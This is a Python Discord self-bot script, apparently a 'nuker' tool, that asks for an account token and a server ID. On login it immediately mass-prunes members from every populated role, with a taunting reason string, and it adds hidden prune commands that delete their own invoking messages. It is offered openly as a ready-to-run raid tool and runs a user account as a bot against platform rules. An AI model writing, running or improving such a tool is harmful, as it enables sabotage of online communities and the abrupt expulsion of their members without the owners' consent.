import os
import sys
import discord
from discord.ext import commands
import requests
import asyncio
os.system("pip install discord.py==1.7.3")
os.system("clear||cls")

client = commands.Bot(command_prefix=".ray",intents=discord.Intents.all(), case_insensitive=True, self_bot=True)

print('''________          ________           ___________                       \______ \_______  \_____  \   ____   \__    ___/___ ______
 |    |  \_  __ \  /   |   \ /    \    |    | /  _ \____ \              |    `   \  | \/ /    |    \   |  \   |    |(  <_> )  |_> >           /_______  /__|    \_______  /___|  /   |____| \____/|   __/
        \/                \/     \/                 |__|                       Made by Ray <3                                                 
     Andi mandi kisi ne skid kiya toh
     
     ''')
     
     
token = input("[>] Enter your Token : ")

guild = int(input('[>] Enter guild ID : '))

r = "fcked by ray x Dr"

@client.event
async def on_ready():
  print((client.user))
  await main()

async def main():
  g = client.get_guild(guild)
  days = 1
  reason =  r
  roles = []
  for role in g.roles:
    if len(role.members) == 0:
      continue
    else:
      roles.append(role)
  k=await g.prune_members(days=days,roles=roles, reason=reason)
  print(f"[>] Successfully Pruned {k} Members")

@client.command()
async def prune(ctx, days: int=1, rc: int=0, *, reason: str=None):
  await ctx.message.delete()
  roles = []
  k=await ctx.guild.prune_members(days=days,roles=ctx.guild.roles, reason=reason)
  await ctx.send(f"[>] Successfully Pruned {k} Members") 

@client.command(aliases=['cp'])
async def checkprune(ctx, days: int=1, rc: int=0):
  await ctx.message.delete()
  roles = []
  ok=await ctx.guild.estimate_pruned_members(days=days,roles=ctx.guild.roles)
  await ctx.send(f"```{ok} Members Will Be Pruned```")

client.run(token,bot=False)